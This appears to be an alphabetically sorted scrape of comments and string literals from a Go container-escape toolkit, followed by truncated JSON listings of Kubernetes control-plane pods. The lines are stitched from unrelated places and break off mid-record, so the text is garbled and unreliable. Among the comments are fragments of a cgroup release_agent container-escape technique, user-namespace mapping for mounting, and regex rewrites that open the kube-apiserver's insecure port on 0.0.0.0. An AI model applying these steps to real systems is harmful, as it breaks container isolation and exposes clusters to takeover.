"// if !strings.Contains(json, ""--insecure-bind-address"") {"
"// if !strings.Contains(json, ""--insecure-port"") {"
"// if your script needs input, handle "
"// if your script needs input, parse os.Args by yourself."
"// init: fix ""build constraints exclude all Go files in /pkg/task"""
"// json = reg.ReplaceAllString(json, ""${1}0.0.0.0${3}"")"
"// json = reg.ReplaceAllString(json, ""${1}9443${3}"")"
"// json = reg.ReplaceAllString(json, ""${1}true${3}"")"
"// m, err := convert.conn.Read(p)"
"// means Device is ""none"""
"// nc needs -v and -h , parse it outside"
"// newDevicesCgroup like ""mount -t cgroup -o devices devices /tmp/cdk_dcgroup"
"// out, _ := ioutil.ReadAll(r)"
"// param pid: 0 = self, 1 = container main process"
"// parse url if opts.Url is """""
"// prerequisites satisfied, move current process in new user namespace"
"// r, w, _ := os.Pipe()"
"// rand.Int63() generates 63 random bits, enough for letterIdxMax characters!"
"// read /proc/self/mountinfo instead of /etc/mtab, since former one is already implemented"
"// sample: {""metadata"":{""name"":""kube-apiserver-ubuntu-linux-20-04-desktop"",""namespace"":""kube-system"",""uid"":""b7564d4e-3bb1-48ef-8885-3984be70f46d"" .. -> kube-apiserver-ubuntu-linux-20-04-desktop"
"// sed ""s,$(printf '"
"// sleep and read result, must use Wait() to avoid zombie process."
"// support input format like: username or username,username1,username2"
"// test-poc can not delete, if we delete, will cause panic in Github Action with an unknown error"
"// tested in ubuntu docker, only usable in cgroup v1 containers"
"// walk starts from StartDir and match substring(AbsFilePath,<names in NameList>)"
"//// get current userid,groupid for mapping"
"//// reason above, strace "
"//// set uid and gid mapping, so you have all the caps required in new namespace to mount."
"//echo ""$host_path/cmd"" > /tmp/cgrp/release_agent"
"//echo ""ps aux > $host_path/output"" >> /cmd"
"//err = ioutil.WriteFile(fmt.Sprintf(""/proc/%d/gid_map"", reExecCmd.Process.Pid), []byte(gidMapStr), 0644)"
"//err = ioutil.WriteFile(fmt.Sprintf(""/proc/%d/setgroups"", reExecCmd.Process.Pid), []byte(""deny""), 0644)"
"//err = ioutil.WriteFile(fmt.Sprintf(""/proc/%d/uid_map"", reExecCmd.Process.Pid), []byte(uidMapStr), 0644)"
"//fmt.Println(""request data:"",data)"
"//fmt.Println(""response_data:"",resp)"
"//gidMapStr := fmt.Sprintf(""0 %d 1"", os.Getegid())"
"//log.Println(""Use local token:"", sysToken)"
"//sh -c ""echo "
"//uidMapStr := fmt.Sprintf(""0 %d 1"", os.Geteuid())"
"0-9.]/}"""
"00000000a80425fb',"
"0000003fffffffff',"
"08:00"",""kubernetes.io/config.source"":""file"",""kubernetes.io/psp"":""ack.privileged""}},""spec"":{""volumes"":[{""name"":""ca-certs"",""hostPath"":{""path"":""/etc/ssl/certs"",""type"":""DirectoryOrCreate""}},{""name"":""etc-pki"",""hostPath"":{""path"":""/etc/pki"",""type"":""DirectoryOrCreate""}},{""name"":""k8s-certs"",""hostPath"":{""path"":""/etc/kubernetes/pki"",""type"":""DirectoryOrCreate""}},{""name"":""kubeconfig"",""hostPath"":{""path"":""/etc/kubernetes/controller-manager.conf"",""type"":""FileOrCreate""}},{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}}],""containers"":[{""name"":""kube-controller-manager"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager:v1.16.6-aliyun.1"",""command"":[""kube-controller-manager"",""--experimental-cluster-signing-duration=87600h0m0s"",""--allocate-node-cidrs=true"",""--authentication-kubeconfig=/etc/kubernetes/controller-manager.conf"",""--authorization-kubeconfig=/etc/kubernetes/controller-manager.conf"",""--bind-address=127.0.0.1"",""--client-ca-file=/etc/kubernetes/pki/ca.crt"",""--cloud-provider=external"",""--cluster-cidr=172.20.0.0/16"",""--cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt"",""--cluster-signing-key-file=/etc/kubernetes/pki/ca.key"",""--controllers="
"08:00"",""kubernetes.io/config.source"":""file"",""kubernetes.io/psp"":""ack.privileged""}},""spec"":{""volumes"":[{""name"":""k8s-audit"",""hostPath"":{""path"":""/var/log/kubernetes"",""type"":""DirectoryOrCreate""}},{""name"":""audit-policy"",""hostPath"":{""path"":""/etc/kubernetes/audit-policy.yml"",""type"":""FileOrCreate""}},{""name"":""ca-certs"",""hostPath"":{""path"":""/etc/ssl/certs"",""type"":""DirectoryOrCreate""}},{""name"":""etc-pki"",""hostPath"":{""path"":""/etc/pki"",""type"":""DirectoryOrCreate""}},{""name"":""k8s-certs"",""hostPath"":{""path"":""/etc/kubernetes/pki"",""type"":""DirectoryOrCreate""}},{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}}],""containers"":[{""name"":""kube-apiserver"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""command"":[""kube-apiserver"",""--audit-log-maxbackup=10"",""--audit-log-maxsize=100"",""--audit-log-path=/var/log/kubernetes/kubernetes.audit"",""--audit-log-maxage=30"",""--audit-policy-file=/etc/kubernetes/audit-policy.yml"",""--apiserver-count=500"",""--endpoint-reconciler-type=lease"",""--enable-aggregator-routing=true"",""--runtime-config=admissionregistration.k8s.io/v1beta1,extensions/v1beta1/daemonsets=true,extensions/v1beta1/deployments=true,extensions/v1beta1/replicasets=true,extensions/v1beta1/networkpolicies=true,extensions/v1beta1/podsecuritypolicies=true,apps/v1beta1=true,apps/v1beta2=true"",""--advertise-address=192.168.0.151"",""--allow-privileged=true"",""--authorization-mode=Node,RBAC"",""--client-ca-file=/etc/kubernetes/pki/apiserver-ca.crt"",""--cloud-provider=external"",""--enable-admission-plugins=NodeRestriction,PodSecurityPolicy"",""--enable-bootstrap-token-auth=true"",""--etcd-cafile=/etc/kubernetes/pki/etcd/ca.pem"",""--etcd-certfile=/etc/kubernetes/pki/etcd/etcd-client.pem"",""--etcd-keyfile=/etc/kubernetes/pki/etcd/etcd-client-key.pem"",""--etcd-servers=https://192.168.0.150:2379,https://192.168.0.151:2379,https://192.168.0.152:2379"",""--feature-gates=VolumeSnapshotDataSource=true,CSINodeInfo=true,CSIDriverRegistry=true"",""--insecure-port=0"",""--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt"",""--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key"",""--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname"",""--profiling=false"",""--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt"",""--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key"",""--requestheader-allowed-names=front-proxy-client"",""--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt"",""--requestheader-extra-headers-prefix=X-Remote-Extra-"",""--requestheader-group-headers=X-Remote-Group"",""--requestheader-username-headers=X-Remote-User"",""--secure-port=6443"",""--service-account-key-file=/etc/kubernetes/pki/sa.pub"",""--service-cluster-ip-range=172.21.0.0/20"",""--service-node-port-range=30000-32767"",""--tls-cert-file=/etc/kubernetes/pki/apiserver.crt"",""--tls-private-key-file=/etc/kubernetes/pki/apiserver.key""],""env"":[{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4"",""value"":""/var/log/kubernetes/kubernetes.audit""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_tags"",""value"":""audit=apiserver""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_product"",""value"":""k8s-audit""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_jsonfile"",""value"":""true""}],""resources"":{""requests"":{""cpu"":""250m""}},""volumeMounts"":[{""name"":""k8s-audit"",""mountPath"":""/var/log/kubernetes""},{""name"":""audit-policy"",""readOnly"":true,""mountPath"":""/etc/kubernetes/audit-policy.yml""},{""name"":""ca-certs"",""readOnly"":true,""mountPath"":""/etc/ssl/certs""},{""name"":""etc-pki"",""readOnly"":true,""mountPath"":""/etc/pki""},{""name"":""k8s-certs"",""readOnly"":true,""mountPath"":""/etc/kubernetes/pki""},{""name"":""localtime"",""mountPath"":""/etc/localtime""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":6443,""host"":""192.168.0.151"",""scheme"":""HTTPS""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeName"":""cn-beijing.192.168.0.151"",""hostNetwork"":true,""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists"",""effect"":""NoExecute""}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:09:02Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:09:02Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:09:02Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:09:02Z""}],""hostIP"":""192.168.0.151"",""podIP"":""192.168.0.151"",""podIPs"":[{""ip"":""192.168.0.151""}],""startTime"":""2020-04-08T04:09:02Z"",""containerStatuses"":[{""name"":""kube-apiserver"",""state"":{""running"":{""startedAt"":""2020-04-08T04:08:55Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver@sha256:fee22221e79180ebbfa2641ff66d033ef52fe887e112761a8911bf86ae345e1c"",""containerID"":""docker://612cd2c7815ee0ca70b278051b01129007c7d2d2d5c946d6a6c3d6ca55fab92a"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-apiserver-cn-beijing.192.168.0.152"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-apiserver-cn-beijing.192.168.0.152"",""uid"":""e2013abd-55f9-4536-9191-2608ed515aac"",""resourceVersion"":""814"",""creationTimestamp"":""2020-04-08T04:09:02Z"",""labels"":{""component"":""kube-apiserver"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/config.hash"":""0f22d8bb971af79b9942ab7f38329446"",""kubernetes.io/config.mirror"":""0f22d8bb971af79b9942ab7f38329446"",""kubernetes.io/config.seen"":""2020-04-08T12:09:02.695463405"
"08:00"",""kubernetes.io/config.source"":""file"",""kubernetes.io/psp"":""ack.privileged""}},""spec"":{""volumes"":[{""name"":""kubeconfig"",""hostPath"":{""path"":""/etc/kubernetes/scheduler.conf"",""type"":""FileOrCreate""}},{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}}],""containers"":[{""name"":""kube-scheduler"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-scheduler:v1.16.6-aliyun.1"",""command"":[""kube-scheduler"",""--authentication-kubeconfig=/etc/kubernetes/scheduler.conf"",""--authorization-kubeconfig=/etc/kubernetes/scheduler.conf"",""--bind-address=127.0.0.1"",""--kubeconfig=/etc/kubernetes/scheduler.conf"",""--leader-elect=true"",""--profiling=false""],""resources"":{""requests"":{""cpu"":""100m""}},""volumeMounts"":[{""name"":""kubeconfig"",""readOnly"":true,""mountPath"":""/etc/kubernetes/scheduler.conf""},{""name"":""localtime"",""mountPath"":""/etc/localtime""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10251,""host"":""127.0.0.1"",""scheme"":""HTTP""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeName"":""cn-beijing.192.168.0.152"",""hostNetwork"":true,""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists"",""effect"":""NoExecute""}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:44Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:44Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:44Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:44Z""}],""hostIP"":""192.168.0.152"",""podIP"":""192.168.0.152"",""podIPs"":[{""ip"":""192.168.0.152""}],""startTime"":""2020-04-08T04:08:44Z"",""containerStatuses"":[{""name"":""kube-scheduler"",""state"":{""running"":{""startedAt"":""2020-04-08T04:08:31Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-scheduler:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-scheduler@sha256:ca6c8fdb476ef0541b38da740a11f7e7ccd01842bd0a3421ffb62b4aa1eadcb4"",""containerID"":""docker://cd96ddf6bcedd5271222e33136a72bd7e766810d8af2d079c57bee0fecb8b067"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""metrics-server-54575fbd57-rf9bl"",""generateName"":""metrics-server-54575fbd57-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/metrics-server-54575fbd57-rf9bl"",""uid"":""fc0694b4-e460-4d4f-80ad-459dd76579c3"",""resourceVersion"":""2056"",""creationTimestamp"":""2020-04-08T04:12:30Z"",""labels"":{""k8s-app"":""metrics-server"",""pod-template-hash"":""54575fbd57""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""metrics-server-54575fbd57"",""uid"":""8a03af3b-50aa-4e89-a0c6-b40dabf52220"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""admin-token-t8m2n"",""secret"":{""secretName"":""admin-token-t8m2n"",""defaultMode"":420}}],""containers"":[{""name"":""metrics-server"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/metrics-server:v0.2.1-9dd9511-aliyun"",""command"":[""/metrics-server"",""--source=kubernetes:https://kubernetes.default"",""--sink=socket:tcp://monitor.csk.cn-beijing.aliyuncs.com:8093"
"08:00"",""kubernetes.io/config.source"":""file""}},""spec"":{""volumes"":[{""name"":""ca-certs"",""hostPath"":{""path"":""/etc/ssl/certs"",""type"":""DirectoryOrCreate""}},{""name"":""etc-pki"",""hostPath"":{""path"":""/etc/pki"",""type"":""DirectoryOrCreate""}},{""name"":""k8s-certs"",""hostPath"":{""path"":""/etc/kubernetes/pki"",""type"":""DirectoryOrCreate""}},{""name"":""kubeconfig"",""hostPath"":{""path"":""/etc/kubernetes/controller-manager.conf"",""type"":""FileOrCreate""}},{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}}],""containers"":[{""name"":""kube-controller-manager"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager:v1.16.6-aliyun.1"",""command"":[""kube-controller-manager"",""--experimental-cluster-signing-duration=87600h0m0s"",""--allocate-node-cidrs=true"",""--authentication-kubeconfig=/etc/kubernetes/controller-manager.conf"",""--authorization-kubeconfig=/etc/kubernetes/controller-manager.conf"",""--bind-address=127.0.0.1"",""--client-ca-file=/etc/kubernetes/pki/ca.crt"",""--cloud-provider=external"",""--cluster-cidr=172.20.0.0/16"",""--cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt"",""--cluster-signing-key-file=/etc/kubernetes/pki/ca.key"",""--controllers="
"08:00"",""kubernetes.io/config.source"":""file""}},""spec"":{""volumes"":[{""name"":""k8s-audit"",""hostPath"":{""path"":""/var/log/kubernetes"",""type"":""DirectoryOrCreate""}},{""name"":""audit-policy"",""hostPath"":{""path"":""/etc/kubernetes/audit-policy.yml"",""type"":""FileOrCreate""}},{""name"":""ca-certs"",""hostPath"":{""path"":""/etc/ssl/certs"",""type"":""DirectoryOrCreate""}},{""name"":""etc-pki"",""hostPath"":{""path"":""/etc/pki"",""type"":""DirectoryOrCreate""}},{""name"":""k8s-certs"",""hostPath"":{""path"":""/etc/kubernetes/pki"",""type"":""DirectoryOrCreate""}},{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}}],""containers"":[{""name"":""kube-apiserver"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""command"":[""kube-apiserver"",""--audit-log-maxbackup=10"",""--audit-log-maxsize=100"",""--audit-log-path=/var/log/kubernetes/kubernetes.audit"",""--audit-log-maxage=30"",""--audit-policy-file=/etc/kubernetes/audit-policy.yml"",""--apiserver-count=500"",""--endpoint-reconciler-type=lease"",""--enable-aggregator-routing=true"",""--runtime-config=admissionregistration.k8s.io/v1beta1,extensions/v1beta1/daemonsets=true,extensions/v1beta1/deployments=true,extensions/v1beta1/replicasets=true,extensions/v1beta1/networkpolicies=true,extensions/v1beta1/podsecuritypolicies=true,apps/v1beta1=true,apps/v1beta2=true"",""--advertise-address=192.168.0.150"",""--allow-privileged=true"",""--authorization-mode=Node,RBAC"",""--client-ca-file=/etc/kubernetes/pki/apiserver-ca.crt"",""--cloud-provider=external"",""--enable-admission-plugins=NodeRestriction,PodSecurityPolicy"",""--enable-bootstrap-token-auth=true"",""--etcd-cafile=/etc/kubernetes/pki/etcd/ca.pem"",""--etcd-certfile=/etc/kubernetes/pki/etcd/etcd-client.pem"",""--etcd-keyfile=/etc/kubernetes/pki/etcd/etcd-client-key.pem"",""--etcd-servers=https://192.168.0.150:2379,https://192.168.0.151:2379,https://192.168.0.152:2379"",""--feature-gates=VolumeSnapshotDataSource=true,CSINodeInfo=true,CSIDriverRegistry=true"",""--insecure-port=0"",""--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt"",""--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key"",""--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname"",""--profiling=false"",""--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt"",""--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key"",""--requestheader-allowed-names=front-proxy-client"",""--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt"",""--requestheader-extra-headers-prefix=X-Remote-Extra-"",""--requestheader-group-headers=X-Remote-Group"",""--requestheader-username-headers=X-Remote-User"",""--secure-port=6443"",""--service-account-key-file=/etc/kubernetes/pki/sa.pub"",""--service-cluster-ip-range=172.21.0.0/20"",""--service-node-port-range=30000-32767"",""--tls-cert-file=/etc/kubernetes/pki/apiserver.crt"",""--tls-private-key-file=/etc/kubernetes/pki/apiserver.key""],""env"":[{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4"",""value"":""/var/log/kubernetes/kubernetes.audit""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_tags"",""value"":""audit=apiserver""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_product"",""value"":""k8s-audit""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_jsonfile"",""value"":""true""}],""resources"":{""requests"":{""cpu"":""250m""}},""volumeMounts"":[{""name"":""k8s-audit"",""mountPath"":""/var/log/kubernetes""},{""name"":""audit-policy"",""readOnly"":true,""mountPath"":""/etc/kubernetes/audit-policy.yml""},{""name"":""ca-certs"",""readOnly"":true,""mountPath"":""/etc/ssl/certs""},{""name"":""etc-pki"",""readOnly"":true,""mountPath"":""/etc/pki""},{""name"":""k8s-certs"",""readOnly"":true,""mountPath"":""/etc/kubernetes/pki""},{""name"":""localtime"",""mountPath"":""/etc/localtime""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":6443,""host"":""192.168.0.150"",""scheme"":""HTTPS""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeName"":""cn-beijing.192.168.0.150"",""hostNetwork"":true,""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists"",""effect"":""NoExecute""}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:52Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:52Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:52Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:52Z""}],""hostIP"":""192.168.0.150"",""podIP"":""192.168.0.150"",""podIPs"":[{""ip"":""192.168.0.150""}],""startTime"":""2020-04-08T04:08:52Z"",""containerStatuses"":[{""name"":""kube-apiserver"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:26Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:08:45Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://e6b39e8558945aa0943c5daffca465205aa932ae574e5d236b7a73a0e7afd376""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver@sha256:fee22221e79180ebbfa2641ff66d033ef52fe887e112761a8911bf86ae345e1c"",""containerID"":""docker://2ba1f9a5390f9af1b61e8a0101f872a85b510f4af4b87aa9f5b2a4fca30657c0"",""started"":true}],""qosClass"":""Burstable""}}"
"08:00"",""kubernetes.io/config.source"":""file""}},""spec"":{""volumes"":[{""name"":""k8s-audit"",""hostPath"":{""path"":""/var/log/kubernetes"",""type"":""DirectoryOrCreate""}},{""name"":""audit-policy"",""hostPath"":{""path"":""/etc/kubernetes/audit-policy.yml"",""type"":""FileOrCreate""}},{""name"":""ca-certs"",""hostPath"":{""path"":""/etc/ssl/certs"",""type"":""DirectoryOrCreate""}},{""name"":""etc-pki"",""hostPath"":{""path"":""/etc/pki"",""type"":""DirectoryOrCreate""}},{""name"":""k8s-certs"",""hostPath"":{""path"":""/etc/kubernetes/pki"",""type"":""DirectoryOrCreate""}},{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}}],""containers"":[{""name"":""kube-apiserver"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""command"":[""kube-apiserver"",""--audit-log-maxbackup=10"",""--audit-log-maxsize=100"",""--audit-log-path=/var/log/kubernetes/kubernetes.audit"",""--audit-log-maxage=30"",""--audit-policy-file=/etc/kubernetes/audit-policy.yml"",""--apiserver-count=500"",""--endpoint-reconciler-type=lease"",""--enable-aggregator-routing=true"",""--runtime-config=admissionregistration.k8s.io/v1beta1,extensions/v1beta1/daemonsets=true,extensions/v1beta1/deployments=true,extensions/v1beta1/replicasets=true,extensions/v1beta1/networkpolicies=true,extensions/v1beta1/podsecuritypolicies=true,apps/v1beta1=true,apps/v1beta2=true"",""--advertise-address=192.168.0.150"",""--allow-privileged=true"",""--authorization-mode=Node,RBAC"",""--client-ca-file=/etc/kubernetes/pki/apiserver-ca.crt"",""--cloud-provider=external"",""--enable-admission-plugins=NodeRestriction,PodSecurityPolicy"",""--enable-bootstrap-token-auth=true"",""--etcd-cafile=/etc/kubernetes/pki/etcd/ca.pem"",""--etcd-certfile=/etc/kubernetes/pki/etcd/etcd-client.pem"",""--etcd-keyfile=/etc/kubernetes/pki/etcd/etcd-client-key.pem"",""--etcd-servers=https://192.168.0.150:2379,https://192.168.0.151:2379,https://192.168.0.152:2379"",""--feature-gates=VolumeSnapshotDataSource=true,CSINodeInfo=true,CSIDriverRegistry=true"",""--insecure-port=0"",""--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt"",""--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key"",""--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname"",""--profiling=false"",""--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt"",""--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key"",""--requestheader-allowed-names=front-proxy-client"",""--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt"",""--requestheader-extra-headers-prefix=X-Remote-Extra-"",""--requestheader-group-headers=X-Remote-Group"",""--requestheader-username-headers=X-Remote-User"",""--secure-port=6443"",""--service-account-key-file=/etc/kubernetes/pki/sa.pub"",""--service-cluster-ip-range=172.21.0.0/20"",""--service-node-port-range=30000-32767"",""--tls-cert-file=/etc/kubernetes/pki/apiserver.crt"",""--tls-private-key-file=/etc/kubernetes/pki/apiserver.key""],""env"":[{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4"",""value"":""/var/log/kubernetes/kubernetes.audit""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_tags"",""value"":""audit=apiserver""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_product"",""value"":""k8s-audit""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_jsonfile"",""value"":""true""}],""resources"":{""requests"":{""cpu"":""250m""}},""volumeMounts"":[{""name"":""k8s-audit"",""mountPath"":""/var/log/kubernetes""},{""name"":""audit-policy"",""readOnly"":true,""mountPath"":""/etc/kubernetes/audit-policy.yml""},{""name"":""ca-certs"",""readOnly"":true,""mountPath"":""/etc/ssl/certs""},{""name"":""etc-pki"",""readOnly"":true,""mountPath"":""/etc/pki""},{""name"":""k8s-certs"",""readOnly"":true,""mountPath"":""/etc/kubernetes/pki""},{""name"":""localtime"",""mountPath"":""/etc/localtime""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":6443,""host"":""192.168.0.150"",""scheme"":""HTTPS""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeName"":""cn-beijing.192.168.0.150"",""hostNetwork"":true,""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists"",""effect"":""NoExecute""}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:52Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:52Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:52Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:52Z""}],""hostIP"":""192.168.0.150"",""podIP"":""192.168.0.150"",""podIPs"":[{""ip"":""192.168.0.150""}],""startTime"":""2020-04-08T04:08:52Z"",""containerStatuses"":[{""name"":""kube-apiserver"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:26Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:08:45Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://e6b39e8558945aa0943c5daffca465205aa932ae574e5d236b7a73a0e7afd376""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver@sha256:fee22221e79180ebbfa2641ff66d033ef52fe887e112761a8911bf86ae345e1c"",""containerID"":""docker://2ba1f9a5390f9af1b61e8a0101f872a85b510f4af4b87aa9f5b2a4fca30657c0"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-apiserver-cn-beijing.192.168.0.151"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-apiserver-cn-beijing.192.168.0.151"",""uid"":""cc5cdba3-2cf6-404d-aaea-cf133ae90ec9"",""resourceVersion"":""800"",""creationTimestamp"":""2020-04-08T04:09:01Z"",""labels"":{""component"":""kube-apiserver"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/config.hash